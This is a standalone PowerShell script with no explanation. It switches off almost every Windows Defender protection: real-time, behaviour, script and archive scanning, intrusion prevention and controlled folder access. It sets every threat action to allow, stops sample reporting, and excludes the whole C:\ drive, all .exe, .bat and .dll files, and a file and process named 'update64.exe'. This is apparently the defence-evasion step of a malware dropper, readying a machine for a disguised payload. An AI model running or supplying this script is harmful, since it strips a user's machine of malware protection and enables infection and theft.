Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".exe"
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8
Set-MpPreference -MAPSReporting 0
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6  
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8
Add-MpPreference -ExclusionPath "C:\"
Add-MpPreference -ExclusionPath "C:\update64.exe"
Add-MpPreference -ExclusionPath "C:\update64.exe"
Add-MpPreference -ExclusionProcess "update64.exe"
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".dll"
Add-MpPreference -ExclusionExtension ".exe"